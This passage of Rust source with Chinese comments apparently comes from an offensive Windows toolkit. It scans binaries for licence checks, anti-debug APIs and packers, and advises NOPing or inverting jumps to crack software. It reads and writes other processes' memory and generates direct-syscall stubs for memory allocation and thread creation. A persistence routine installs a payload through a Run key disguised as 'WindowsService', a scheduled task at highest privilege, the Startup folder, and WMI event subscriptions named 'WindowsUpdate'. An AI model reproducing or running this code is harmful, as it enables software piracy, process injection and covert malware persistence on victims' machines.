        out.push_str("  - 使用 dll_jmp_invert 反转许可证检查的条件跳转\n");
        out.push_str("  - 使用 dll_strings + dll_search 定位具体偏移\n");
    }
    Ok(out)
}

// ═══════════════ 密码常量扫描 v3.3 ═══════════════

fn crypto_scan(path: &str) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    let mut out = format!("═══ 密码常量扫描: {} ═══\n\n", path);

    // 已知密码常量
    let constants: &[(&str, &[u8])] = &[
        // AES S-Box
        ("AES S-Box (Rijndael)", &[
            0x63,0x7C,0x77,0x7B,0xF2,0x6B,0x6F,0xC5,0x30,0x01,0x67,0x2B,0xFE,0xD7,0xAB,0x76,
        ]),
        // AES Inverse S-Box
        ("AES Inv S-Box", &[
            0x52,0x09,0x6A,0xD5,0x30,0x36,0xA5,0x38,0xBF,0x40,0xA3,0x9E,0x81,0xF3,0xD7,0xFB,
        ]),
        // MD5 IV
        ("MD5 IV", &[0x01,0x23,0x45,0x67,0x89,0xAB,0xCD,0xEF]),
        // SHA1 IV
        ("SHA1 IV", &[0x67,0x45,0x23,0x01,0xEF,0xCD,0xAB,0x89,0x98,0xBA,0xDC,0xFE]),
        // SHA256 IV
        ("SHA256 IV", &[0x6A,0x09,0xE6,0x67,0xBB,0x67,0xAE,0x85,0x3C,0x6E,0xF3,0x72]),
        // CRC32 table (first bytes)
        ("CRC32 Table", &[0x00,0x00,0x00,0x00,0x77,0x07,0x30,0x96,0xEE,0x0E,0x61,0x2C,0x99,0x09,0x51,0xBA]),
        // RC4/ARC4 (no fixed constant, but key schedule pattern)
    ];

    for (name, sig) in constants {
        let mut pos = 0usize;
        let mut matches = 0usize;
        while pos + sig.len() <= data.len() {
            if data[pos..pos+sig.len()] == **sig {
                if matches == 0 {
                    out.push_str(&format!("  [+] {} — 发现! 偏移:", name));
                }
                out.push_str(&format!(" 0x{:08X}", pos));
                matches += 1;
                if matches >= 5 { out.push_str(" ..."); break; }
            }
            pos += 1;
        }
        if matches > 0 { out.push_str(&format!("\n     ({}处匹配)\n", matches)); }
    }

    // TEA/XTEA delta constant: 0x9E3779B9
    let tea_delta: [u8;4] = [0xB9,0x79,0x37,0x9E];
    let mut tea_pos = Vec::new();
    for p in 0..data.len()-4 {
        if data[p..p+4] == tea_delta { tea_pos.push(p); }
    }
    if !tea_pos.is_empty() {
        out.push_str(&format!("  [+] TEA/XTEA Delta (0x9E3779B9) — {}处: ", tea_pos.len()));
        for p in tea_pos.iter().take(5) { out.push_str(&format!("0x{:08X} ", p)); }
        out.push_str("\n");
    }

    // Base64 alphabet
    if data.windows(64).any(|w| w == b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/") {
        out.push_str("  [+] Base64编码表 — 发现\n");
    }

    out.push_str("\n[·] 完成\n");
    Ok(out)
}

// ═══════════════ 序列号验证扫描 v3.3 ═══════════════

fn serial_scan(path: &str) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    let mut out = format!("═══ 序列号验证扫描: {} ═══\n\n", path);

    let keywords = [
        ("serial", "序列号"), ("license", "许可证"), ("register", "注册"),
        ("key", "密钥"), ("activation", "激活"), ("unlock", "解锁"),
        ("trial", "试用"), ("demo", "演示版"), ("expire", "过期"),
        ("valid", "验证"), ("invalid", "无效"), ("purchase", "购买"),
        ("subscription", "订阅"), ("product key", "产品密钥"),
        ("registration", "注册码"), ("authorization", "授权"),
        ("evaluation", "评估版"), ("crack", "破解检测"),
    ];

    let mut out_str = String::new();
    let mut cur = Vec::new();
    for &b in &data {
        if b.is_ascii_graphic() || b == b' ' { cur.push(b); }
        else if cur.len() >= 3 {
            out_str.push_str(&String::from_utf8_lossy(&cur));
            out_str.push('\n');
            cur.clear();
        } else { cur.clear(); }
    }
    let lower = out_str.to_lowercase();

    for (kw, desc) in &keywords {
        if lower.contains(kw) {
            // 找偏移
            let mut pos = 0usize;
            let mut first = true;
            while let Some(p) = lower[pos..].find(kw) {
                let abs_p = pos + p;
                if first { out.push_str(&format!("  [!] {} ({}) → ", kw, desc)); first = false; }
                out.push_str(&format!("0x{:X} ", abs_p));
                pos = abs_p + 1;
                if pos >= lower.len() { break; }
            }
            if !first { out.push_str("\n"); }
        }
    }

    out.push_str("\n[*] 提示: 使用 dll_disasm 反汇编附近代码定位验证逻辑\n");
    out.push_str("[*] 在验证函数入口NOP掉call, 或反转条件跳转(JZ→JNZ)即可绕过\n");
    Ok(out)
}

// ═══════════════ 魔术常量扫描 v3.3 ═══════════════

fn constants_scan(path: &str) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("読み取り失敗: {}", e))?;
    let mut out = format!("═══ 魔术常量扫描: {} ═══\n\n", path);

    let magics: &[(&str, &[u8], &str)] = &[
        ("MZ头", b"MZ", "DOS/PE文件"),
        ("PE\\0\\0", b"PE\0\0", "PE签名"),
        ("GIF89a", b"GIF89a", "GIF图像"),
        ("JFIF", b"JFIF", "JPEG图像"),
        ("\\x89PNG", b"\x89PNG", "PNG图像"),
        ("PK\\x03\\x04", b"PK\x03\x04", "ZIP/PKZIP"),
        ("BZh", b"BZh", "BZip2压缩"),
        ("\\x1F\\x8B", b"\x1F\x8B", "GZip压缩"),
        ("Rar!", b"Rar!", "RAR压缩"),
        ("7z\\xBC\\xAF", b"7z\xBC\xAF", "7-Zip压缩"),
        ("\\xD0\\xCF\\x11\\xE0", b"\xD0\xCF\x11\xE0", "OLE/Office文档"),
        ("SQLite", b"SQLite", "SQLite数据库"),
        ("IHDR", b"IHDR", "PNG IHDR块"),
        ("RIFF", b"RIFF", "RIFF/WAV/AVI"),
        ("UPX0", b"UPX0", "UPX加壳"),
        ("UPX1", b"UPX1", "UPX加壳"),
        ("\\xFF\\xD8\\xFF", b"\xFF\xD8\xFF", "JPEG SOI"),
        ("\\x25\\x50\\x44\\x46", b"%PDF", "PDF文件"),
    ];

    for (name, sig, desc) in magics {
        if data.windows(sig.len()).any(|w| w == *sig) {
            out.push_str(&format!("  [+] {} — {} — {}\n", name, sig.iter().map(|b| format!("{:02X}",b)).collect::<Vec<_>>().join(" "), desc));
        }
    }

    // 知名DWORD值
    let dwords: &[(u32, &str)] = &[
        (0x9E3779B9, "TEA/XTEA Delta"), (0xC6EF3720, "XTEA Delta (alt)"),
        (0x61C88647, "TEA Delta (neg)"), (0xDEADBEEF, "DEADBEEF"),
        (0xDEADC0DE, "DEADC0DE"), (0xBAADF00D, "BAADF00D"),
        (0xCAFEBABE, "CAFEBABE"), (0xFEEDFACE, "FEEDFACE"),
        (0x0BADC0DE, "0BADC0DE"),
    ];

    for (dw, name) in dwords {
        let bytes = dw.to_le_bytes();
        let mut found = false;
        for p in 0..data.len().saturating_sub(4) {
            if data[p..p+4] == bytes { found = true; break; }
        }
        if found { out.push_str(&format!("  [+] 0x{:08X} — {}\n", dw, name)); }
    }

    Ok(out)
}

// ═══════════════ 反调试检测扫描 v3.3 ═══════════════

fn anti_debug_scan(path: &str) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    let mut out = format!("═══ 反调试扫描: {} ═══\n\n", path);

    // 构建字符串表
    let mut str_data = String::new();
    let mut cur = Vec::new();
    for &b in &data {
        if b.is_ascii_graphic() || b == b' ' { cur.push(b); }
        else if cur.len() >= 3 { str_data.push_str(&String::from_utf8_lossy(&cur)); str_data.push('\n'); cur.clear(); }
        else { cur.clear(); }
    }
    let sl = str_data.to_lowercase();

    let checks = [
        ("IsDebuggerPresent", "Win32 API — 检测用户态调试器", "kernel32"),
        ("CheckRemoteDebuggerPresent", "Win32 API — 检测远程调试器", "kernel32"),
        ("NtQueryInformationProcess", "NT API — ProcessDebugPort(7)", "ntdll"),
        ("NtQuerySystemInformation", "NT API — SystemKernelDebugger(35)", "ntdll"),
        ("ZwQueryInformationProcess", "NT API (Zw变体)", "ntdll"),
        ("OutputDebugStringA", "OutputDebugString — 异常/反附着", "kernel32"),
        ("OutputDebugStringW", "OutputDebugStringW", "kernel32"),
        ("DbgBreakPoint", "DbgBreakPoint — 触发断点", "ntdll"),
        ("DbgUiRemoteBreakin", "DbgUiRemoteBreakin — 远程断入", "ntdll"),
        ("NtSetInformationThread", "隐藏线程(ThreadHideFromDebugger)", "ntdll"),
        ("NtClose", "NtClose异常 — 检测调试器", "ntdll"),
        ("CsrGetProcessId", "CsrGetProcessId — 检测csrss", "ntdll"),
        ("FindWindowA", "FindWindow — 检测分析工具窗口", "user32"),
        ("FindWindowW", "FindWindowW", "user32"),
        ("GetWindowTextA", "枚举窗口 — 检测分析工具", "user32"),
        ("EnumWindows", "EnumWindows — 枚举窗口", "user32"),
        ("GetTickCount", "GetTickCount — 时间检测反调试", "kernel32"),
        ("QueryPerformanceCounter", "QueryPerformanceCounter — 高精度计时", "kernel32"),
        ("GetSystemTimeAsFileTime", "系统时间 — 时间检测", "kernel32"),
        ("NtQueryPerformanceCounter", "NT API计时", "ntdll"),
        ("NtDelayExecution", "延迟执行 — 反沙箱", "ntdll"),
        ("CreateToolhelp32Snapshot", "进程枚举 — 检测分析工具", "kernel32"),
        ("Process32First", "Process32First", "kernel32"),
        ("Module32First", "Module32First — 模块枚举", "kernel32"),
        ("VirtualProtect", "VirtualProtect — 内存保护修改", "kernel32"),
        ("GetSystemInfo", "GetSystemInfo — 环境检测", "kernel32"),
        ("GetVersionExA", "GetVersionEx — 版本检测", "kernel32"),
        ("RegOpenKeyExA", "注册表 — 检测虚拟机/沙箱", "advapi32"),
        ("BlockInput", "BlockInput — 阻止用户输入", "user32"),
    ];

    let mut found = 0u32;
    for (api, desc, dll) in &checks {
        if sl.contains(&api.to_lowercase()) {
            out.push_str(&format!("  [!] {}.dll!{} — {}\n", dll, api, desc));
            found += 1;
        }
    }

    // 搜索INT3/INT2D/ICEBP/rdtsc字节模式
    let mut int3_count = 0usize;
    for &b in &data { if b == 0xCC { int3_count += 1; } }
    let mut int2d_count = 0usize;
    for p in 0..data.len()-2 {
        if data[p] == 0xCD && data[p+1] == 0x2D { int2d_count += 1; }
    }
    if int3_count > 5 { out.push_str(&format!("  [!] INT3 (0xCC): {}处 — 反调试断点陷阱\n", int3_count)); found += 1; }
    if int2d_count > 0 { out.push_str(&format!("  [!] INT 0x2D: {}处 — 内核调试检测\n", int2d_count)); found += 1; }

    out.push_str(&format!("\n[*] 发现 {} 个反调试特征\n", found));
    if found > 0 {
        out.push_str("[!] 绕过建议:\n");
        out.push_str("  - dll_nop: NOP掉反调试API调用\n");
        out.push_str("  - dll_jmp_invert: 反转检测条件跳转\n");
        out.push_str("  - 使用x64dbg/ScyllaHide在调试时隐藏\n");
    }
    Ok(out)
}

// ═══════════════ 加壳检测 v3.3 ═══════════════

fn unpack_detect(path: &str) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    if data.len() < 64 || u16_le(&data, 0) != 0x5A4D { return Err("无效PE".into()); }

    let mut out = format!("═══ 加壳检测: {} ═══\n\n", path);

    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let opt_start = coff + 20;
    let magic = u16_le(&data, opt_start);
    let is_x64 = magic == 0x20B;
    let entry_rva = if is_x64 { u64_le(&data, opt_start + 16) } else { u32_le(&data, opt_start + 16) as u64 };
    let num_sections = u16_le(&data, coff + 2) as usize;
    let sec_start = coff + 20 + u16_le(&data, coff + 16) as usize;

    let mut sections = Vec::new();
    for i in 0..num_sections {
        let o = sec_start + i * 40;
        let name = String::from_utf8_lossy(&data[o..o+8]).trim_end_matches('\0').to_string();
        let vsize = u32_le(&data, o + 8) as usize;
        let vaddr = u32_le(&data, o + 12);
        let rsize = u32_le(&data, o + 16) as usize;
        let roff = u32_le(&data, o + 20);
        sections.push((name, vaddr, vsize, roff, rsize));
    }

    // 节名特征
    let packer_sections: &[(&[&str], &str)] = &[
        (&["UPX0", "UPX1", "UPX2"], "UPX"),
        (&[".aspack", ".adata"], "ASPack"),
        (&[".MPRESS1", ".MPRESS2"], "MPRESS"),
        (&[".petite"], "Petite"),
        (&[".winapi"], "WinAPI Override (Themida/CodeVirtualizer)"),
        (&[".themida"], "Themida"),
        (&[".vmp0", ".vmp1"], "VMProtect"),
        (&[".enigma"], "Enigma Protector"),
        (&[".obsidium"], "Obsidium"),
        (&[".yzpack"], "YzPack"),
        (&[".mackt"], "MackT"),
        (&[".packed"], "通用加壳标识"),
        (&[".y0da"], "y0da Protector"),
    ];

    let sec_names: Vec<String> = sections.iter().map(|(n,_,_,_,_)| n.to_lowercase()).collect();
    for (sig_names, packer) in packer_sections {
        for sn in *sig_names {
            if sec_names.contains(&sn.to_lowercase()) {
                out.push_str(&format!("  [!] 节名特征: {} → {}\n", sn, packer));
            }
        }
    }

    // 入口点特征
    let ep_in_text = sections.iter().any(|(n,va,vs,_,_)| {
        n == ".text" || n == "CODE" && entry_rva >= *va as u64 && entry_rva < *va as u64 + *vs as u64
    });
    if !ep_in_text {
        out.push_str(&format!("  [!] 入口点({:X})不在.text — 加壳迹象\n", entry_rva));
    }

    // 熵值快速检测
    for (name, _, _, roff, rsize) in &sections {
        if *rsize < 256 || name == ".reloc" { continue; }
        let sec_data = &data[*roff as usize..(*roff as usize + *rsize).min(data.len())];
        let mut counts = [0u32; 256];
        for &b in sec_data { counts[b as usize] += 1; }
        let len = sec_data.len() as f64;
        let mut entropy = 0.0;
        for &c in &counts { if c > 0 { let p = c as f64 / len; entropy -= p * p.log2(); } }
        if entropy > 7.2 {
            out.push_str(&format!("  [!] {} 熵={:.2} — 高度疑似加壳/加密\n", name, entropy));
        }
    }

    // 导入表稀疏 (少导入DLL是加壳特征)
    let dd_start = opt_start + if is_x64 { 112 } else { 96 };
    let import_rva = u32_le(&data, dd_start + 8);
    if import_rva == 0 {
        out.push_str("  [!] 无导入表 — 重度加壳/混淆\n");
    }

    out.push_str("\n[*] 脱壳建议: 使用PEiD/DetectItEasy/x64dbg+脱壳插件\n");
    Ok(out)
}

// ═══════════════ XOR扫描 v3.3 ═══════════════

fn xor_scan(path: &str, min_len: usize) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    let mut out = format!("═══ XOR扫描: {} ═══\n", path);
    out.push_str(&format!("[·] 最小长度: {} | 文件: {}KB\n\n", min_len, data.len()/1024));

    let pbar = progress_create("dll_crack", "xor", "XOR密钥扫描", 256);

    // 搜索高可打印率XOR块
    let mut results = Vec::new();
    let max_scan = (data.len() / 100).min(32768); // 采样限制

    for key in 1..=255u8 {
        if key % 32 == 0 { progress_update(&pbar, key as u64, &format!("密钥: 0x{:02X}", key)); }

        let mut best_offset = 0usize;
        let mut best_score = 0usize;
        let mut best_len = 0usize;
        let mut current_len = 0usize;
        let mut current_score = 0usize;

        for (i, &b) in data.iter().enumerate().take(max_scan) {
            let decoded = b ^ key;
            let is_printable = decoded.is_ascii_graphic() || decoded == b' ' || decoded == b'\n' || decoded == b'\r' || decoded == b'\t';
            if is_printable || decoded == 0 {
                current_len += 1;
                if is_printable { current_score += 1; }
                if current_len >= min_len && current_score > best_score && current_score as f64 / current_len as f64 > 0.7 {
                    best_score = current_score;
                    best_offset = i + 1 - current_len;
                    best_len = current_len;
                }
            } else {
                if current_len >= min_len && current_score > best_score && current_score as f64 / current_len as f64 > 0.7 {
                    best_score = current_score;
                    best_offset = i - current_len;
                    best_len = current_len;
                }
                current_len = 0;
                current_score = 0;
            }
        }

        if best_len >= min_len && best_score as f64 / best_len as f64 > 0.7 {
            let sample: String = data[best_offset..best_offset + best_len.min(80)].iter()
                .map(|&b| {
                    let d = b ^ key;
                    if d.is_ascii_graphic() || d == b' ' { d as char } else { '.' }
                }).collect();
            results.push((key, best_offset, best_len, best_score, sample));
        }
    }

    progress_finish(&pbar);

    results.sort_by_key(|(_, _, len, score, _)| *score * 1000 / *len);
    results.reverse();

    for (key, off, len, score, sample) in results.iter().take(30) {
        let ratio = *score as f64 / *len as f64 * 100.0;
        out.push_str(&format!("  XOR 0x{:02X}  偏移:0x{:08X}  {}B  {:.0}%  |{}|\n",
            key, off, len, ratio, sample));
    }

    out.push_str(&format!("\n[*] {} 个候选XOR密钥\n", results.len().min(30)));
    if !results.is_empty() {
        out.push_str("[!] XOR解码提示:\n");
        out.push_str("  - 使用Python: bytes([b ^ 0x?? for b in data])\n");
        out.push_str("  - 使用CyberChef: XOR Brute Force 模块\n");
    }
    Ok(out)
}

// ═══════════════ Hook扫描 v3.4 ═══════════════

fn hook_scan(pid_str: &str, module_name: &str) -> Result<String, String> {
    let pid = pid_str.parse::<u32>().ok().or_else(|| find_pid(pid_str).ok())
        .ok_or_else(|| format!("无效PID: {}", pid_str))?;
    let (mod_base, mod_size, mod_path) = find_module_info(pid, module_name)?;

    let mut out = format!("═══ Hook扫描: PID={} 模块={} ═══\n\n", pid, module_name);
    out.push_str(&format!("[·] 基址: {:p} 大小: {}KB\n", mod_base, mod_size));
    out.push_str(&format!("[·] 路径: {}\n\n", mod_path));

    let h_proc = unsafe { OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, pid) };
    if h_proc.is_null() || h_proc == INVALID_HANDLE_VALUE {
        return Err(format!("无法打开进程: {}", w32_err()));
    }

    // 读取模块开头 (前4096字节, 包含函数序言)
    let scan_size = 4096usize.min(mod_size as usize);
    let mut buf = vec![0u8; scan_size];
    let mut bytes_read: usize = 0;
    let ret = unsafe { ReadProcessMemory(h_proc, mod_base as LPVOID, buf.as_mut_ptr() as LPVOID, scan_size, &mut bytes_read) };
    unsafe { CloseHandle(h_proc); }
    if ret == 0 { return Err(format!("ReadProcessMemory: {}", w32_err())); }

    // 检测inline hook: 函数序言以 jmp(0xE9)/call(0xE8)/push-ret序列 开头
    // 正常的NT函数序言通常是: mov [rsp+xx], rcx / push rbp / sub rsp, xx
    let mut hooks = Vec::new();
    let mut i = 0;
    while i + 5 < bytes_read {
        // 检测明显的jmp hook: E9 XX XX XX XX (跳转到远处)
        if buf[i] == 0xE9 {
            let rel = i32::from_le_bytes([buf[i+1], buf[i+2], buf[i+3], buf[i+4]]);
            let target = mod_base as usize + i + 5 + rel as usize;
            // 如果跳转目标不在模块范围内, 很可能是hook
            if target < mod_base as usize || target > mod_base as usize + mod_size as usize {
                hooks.push((i, format!("JMP → 0x{:016X} (模块外!)", target)));
            }
        }
        // FF 25 — jmp [rip+disp] 间接跳转
        if i + 6 < bytes_read && buf[i] == 0xFF && buf[i+1] == 0x25 {
            let disp = i32::from_le_bytes([buf[i+2], buf[i+3], buf[i+4], buf[i+5]]);
            let target_addr = mod_base as usize + i + 6 + disp as usize;
            hooks.push((i, format!("JMP [RIP+0x{:X}] — 间接跳转", disp)));
        }
        // PUSH imm32; RET — push-ret hook
        if buf[i] == 0x68 && i + 6 < bytes_read && buf[i+5] == 0xC3 {
            let addr = u32::from_le_bytes([buf[i+1],buf[i+2],buf[i+3],buf[i+4]]);
            hooks.push((i, format!("PUSH 0x{:08X}; RET — push/ret hook", addr)));
        }
        i += 1;
    }

    if hooks.is_empty() {
        out.push_str("[+] 未检测到明显inline hook\n");
    } else {
        out.push_str("─── 可疑Inline Hook ───\n");
        for (off, desc) in &hooks {
            out.push_str(&format!("  [!] +0x{:04X}  {}\n", off, desc));
        }
        out.push_str(&format!("\n[!] 发现 {} 个可疑hook\n", hooks.len()));
    }

    // 自比: 读取磁盘上的干净DLL对比开头
    if std::path::Path::new(&mod_path).exists() {
        if let Ok(disk_data) = std::fs::read(&mod_path) {
            if disk_data.len() >= scan_size {
                let mut diff_count = 0;
                for i in 0..scan_size.min(disk_data.len()) {
                    if buf[i] != disk_data[i] && buf[i] != 0 { diff_count += 1; }
                }
                out.push_str(&format!("\n─── 磁盘对比 ───\n"));
                out.push_str(&format!("[·] 内存 vs 磁盘差异: {} 字节 (前{}B)\n", diff_count, scan_size));
                if diff_count > 10 {
                    out.push_str("[!] 大量差异 — 模块可能被hook或做了运行时重定位\n");
                }
            }
        }
    }

    Ok(out)
}

// ═══════════════ 内存读写 v3.4 ═══════════════

fn mem_read(pid_str: &str, address: usize, size: usize) -> Result<String, String> {
    let pid = pid_str.parse::<u32>().ok().or_else(|| find_pid(pid_str).ok())
        .ok_or_else(|| format!("无效PID: {}", pid_str))?;
    let h_proc = unsafe { OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, pid) };
    if h_proc.is_null() || h_proc == INVALID_HANDLE_VALUE {
        return Err(format!("无法打开进程: {}", w32_err()));
    }
    let mut buf = vec![0u8; size];
    let mut bytes_read: usize = 0;
    let ret = unsafe { ReadProcessMemory(h_proc, address as LPVOID, buf.as_mut_ptr() as LPVOID, size, &mut bytes_read) };
    unsafe { CloseHandle(h_proc); }
    if ret == 0 && bytes_read == 0 { return Err(format!("ReadProcessMemory: {}", w32_err())); }

    let mut out = format!("═══ 内存读取 PID={} @0x{:016X} ═══\n\n", pid, address);
    for row in 0..((bytes_read+15)/16) {
        let off = row * 16;
        let end = (off + 16).min(bytes_read);
        let hex: String = buf[off..end].iter().map(|b| format!("{:02X}", b)).collect::<Vec<_>>().join(" ");
        let ascii: String = buf[off..end].iter().map(|&b| if b.is_ascii_graphic() || b==b' ' { b as char } else { '.' }).collect();
        out.push_str(&format!("  {:016X}  {:48}  |{}|\n", address + off, hex, ascii));
    }
    out.push_str(&format!("\n[·] 读取: {}B\n", bytes_read));
    Ok(out)
}

fn mem_write(pid_str: &str, addr_str: &str, hex_str: &str) -> Result<String, String> {
    let pid = pid_str.parse::<u32>().ok().or_else(|| find_pid(pid_str).ok())
        .ok_or_else(|| format!("无效PID: {}", pid_str))?;
    let address = parse_usize_hex(addr_str).ok_or("无效地址")?;
    let bytes = hex_to_bytes(hex_str)?;

    let h_proc = unsafe { OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, 0, pid) };
    if h_proc.is_null() || h_proc == INVALID_HANDLE_VALUE {
        return Err(format!("无法打开进程: {}", w32_err()));
    }
    let mut written: usize = 0;
    let ret = unsafe { WriteProcessMemory(h_proc, address as LPVOID, bytes.as_ptr() as LPVOID, bytes.len(), &mut written) };
    unsafe { CloseHandle(h_proc); }
    if ret == 0 { return Err(format!("WriteProcessMemory: {}", w32_err())); }

    Ok(format!("═══ 内存写入完成 ═══\n  PID: {}\n  地址: 0x{:016X}\n  写入: {}B\n  HEX: {}",
        pid, address, written, hex_str))
}

// ═══════════════ Syscall表 v3.4 ═══════════════

fn syscall_table(name: &str) -> Result<String, String> {
    // Windows 10/11 x64常见syscall号 (build 19041+)
    let syscalls: &[(&str, u16)] = &[
        ("NtAllocateVirtualMemory", 0x18), ("NtWriteVirtualMemory", 0x3A),
        ("NtReadVirtualMemory", 0x3F), ("NtProtectVirtualMemory", 0x50),
        ("NtCreateThreadEx", 0xC1), ("NtOpenProcess", 0x26),
        ("NtOpenThread", 0xC5), ("NtQueueApcThread", 0x45),
        ("NtCreateProcess", 0xB9), ("NtCreateProcessEx", 0xBA),
        ("NtTerminateProcess", 0x2C), ("NtSuspendProcess", 0xF6),
        ("NtResumeProcess", 0xF7), ("NtClose", 0x0F),
        ("NtQueryInformationProcess", 0x19), ("NtSetInformationProcess", 0x1E),
        ("NtQuerySystemInformation", 0x33), ("NtCreateFile", 0x55),
        ("NtOpenFile", 0x30), ("NtReadFile", 0x06),
        ("NtWriteFile", 0x08), ("NtDeleteFile", 0x34),
        ("NtCreateKey", 0x1A), ("NtOpenKey", 0xB4),
        ("NtSetValueKey", 0x60), ("NtQueryValueKey", 0x15),
        ("NtEnumerateKey", 0x17), ("NtDeleteKey", 0xBD),
        ("NtDeviceIoControlFile", 0x07), ("NtFsControlFile", 0x35),
        ("NtWaitForSingleObject", 0x04), ("NtDelayExecution", 0x32),
        ("NtCreateSection", 0x4A), ("NtMapViewOfSection", 0x28),
        ("NtUnmapViewOfSection", 0x2A), ("NtCreateThread", 0xC7),
        ("NtGetContextThread", 0xF3), ("NtSetContextThread", 0xBF),
        ("NtResumeThread", 0x52), ("NtSuspendThread", 0xDB),
        ("NtQueryVirtualMemory", 0x23), ("NtFreeVirtualMemory", 0x1F),
        ("NtAdjustPrivilegesToken", 0x41), ("NtOpenProcessToken", 0xB5),
        ("NtPowerInformation", 0x5F), ("NtShutdownSystem", 0xD3),
    ];

    if name == "list" {
        let mut out = format!("═══ Windows x64 Syscall表 (Build 19041+) ═══\n\n");
        out.push_str("  Syscall  Name\n");
        out.push_str("  ───────  ────\n");
        for (n, num) in syscalls {
            out.push_str(&format!("  0x{:04X}   {}\n", num, n));
        }
        out.push_str(&format!("\n[·] {} 个syscall\n", syscalls.len()));
        out.push_str("[!] 注意: syscall号随Windows版本变化!\n");
        out.push_str("[*] 生成stub: syscall NtAllocateVirtualMemory\n");
        return Ok(out);
    }

    // 查找特定syscall
    if let Some(&(_, num)) = syscalls.iter().find(|(n,_)| n.eq_ignore_ascii_case(name)) {
        let stub = format!(
            "═══ Syscall Stub: {} ═══\n\n\
             ; x64 MASM/GAS assembly stub\n\
             ; Syscall号: 0x{:04X}\n\n\
             {} PROC\n\
             \tmov r10, rcx          ; syscall约定: r10=第一个参数\n\
             \tmov eax, 0x{:08X}     ; syscall号\n\
             \tsyscall\n\
             \tret\n\
             {} ENDP\n\n\
             // C/C++ 调用:\n\
             // EXTERN_C NTSTATUS {}_stub(HANDLE, PVOID, ...);\n\n\
             // Rust:\n\
             // #[link(name=\"ntdll\")] extern \"system\" fn {}(...);\n\n\
             [!] 编译: nasm -f win64 stub.asm -o stub.obj\n",
            name, num, name, num, name, name, name);
        return Ok(stub);
    }

    Err(format!("未知syscall: {} — 使用 'list' 查看全部", name))
}

// ═══════════════ 持久化安装 v3.4 ═══════════════

fn persist_install(method: &str, payload_path: &str) -> Result<String, String> {
    let abs_path = std::fs::canonicalize(payload_path)
        .map(|p| p.to_string_lossy().to_string())
        .unwrap_or_else(|_| payload_path.to_string());
    if !std::path::Path::new(&abs_path).exists() {
        return Err(format!("Payload不存在: {}", abs_path));
    }

    let mut out = format!("═══ 持久化安装: {} ═══\n\n", method);
    out.push_str(&format!("[·] Payload: {}\n\n", abs_path));

    match method {
        "registry" => {
            // HKCU\Software\Microsoft\Windows\CurrentVersion\Run
            let reg_cmd = format!(
                r#"reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsService" /t REG_SZ /d "\"{}\"" /f"#,
                abs_path);
            let output = std::process::Command::new("cmd").args(["/C", &reg_cmd]).output();
            out.push_str(&format!("[+] 注册表Run键:\n    {}\n", reg_cmd));
            match output {
                Ok(o) if o.status.success() => out.push_str("[+] 安装成功!\n"),
                Ok(o) => out.push_str(&format!("[!] 失败: {}\n", String::from_utf8_lossy(&o.stderr))),
                Err(e) => out.push_str(&format!("[!] 错误: {}\n", e)),
            }
        }
        "task" => {
            let name = std::path::Path::new(&abs_path).file_stem()
                .unwrap_or_default().to_string_lossy();
            let task_cmd = format!(
                r#"schtasks /Create /SC DAILY /TN "{}" /TR "\"{}\"" /F /RL HIGHEST"#,
                name, abs_path);
            let output = std::process::Command::new("cmd").args(["/C", &task_cmd]).output();
            out.push_str(&format!("[+] 计划任务:\n    {}\n", task_cmd));
            match output {
                Ok(o) if o.status.success() => out.push_str("[+] 安装成功!\n"),
                Ok(o) => out.push_str(&format!("[!] 失败: {}\n", String::from_utf8_lossy(&o.stderr))),
                Err(e) => out.push_str(&format!("[!] 错误: {}\n", e)),
            }
        }
        "startup" => {
            let startup_dir = format!(r#"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"#,
                std::env::var("USERNAME").unwrap_or_default());
            let dest = std::path::Path::new(&startup_dir).join(
                std::path::Path::new(&abs_path).file_name().unwrap_or_default());
            std::fs::copy(&abs_path, &dest).map_err(|e| format!("复制失败: {}", e))?;
            out.push_str(&format!("[+] 启动文件夹: {}\n", dest.display()));
            out.push_str("[+] 安装成功! 下次登录时自动执行\n");
        }
        "wmi" => {
            let wmi_cmd = format!(
                r#"wmic /namespace:"\\root\subscription" PATH __EventFilter CREATE Name="WindowsUpdate" EventNamespace="root\cimv2" QueryLanguage="WQL" Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'""#);
            out.push_str("[*] WMI持久化需要管理员权限, 简化实现:\n");
            out.push_str(&format!("    Payload: {}\n", abs_path));
            out.push_str("[!] WMI完整实现请使用 PowerShell:\n");
            out.push_str(&format!(r#"    $Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{{Name='Updater';EventNamespace='root\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA Win32_Process AND TargetInstance.Name=\"explorer.exe\"'}}"#));
            out.push_str("\n");
            out.push_str(&format!(r#"    $Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{{Name='UpdaterConsumer';CommandLineTemplate='{}'}}"#, abs_path));
        }
        _ => return Err(format!("未知方法: {}", method)),
    }

    out.push_str("\n[*] 持久化检测: autoruns / msconfig / Task Scheduler\n");
    Ok(out)
}

// ═══════════════ 添加PE节 v3.4 ═══════════════

fn section_add(path: &str, sec_name: &str, data_or_size: &str) -> Result<String, String> {
    let mut data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    if data.len() < 64 || u16_le(&data, 0) != 0x5A4D { return Err("无效PE".into()); }
    let bak = format!("{}.sec_bak", path);
    std::fs::copy(path, &bak).map_err(|e| format!("备份失败: {}", e))?;

    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
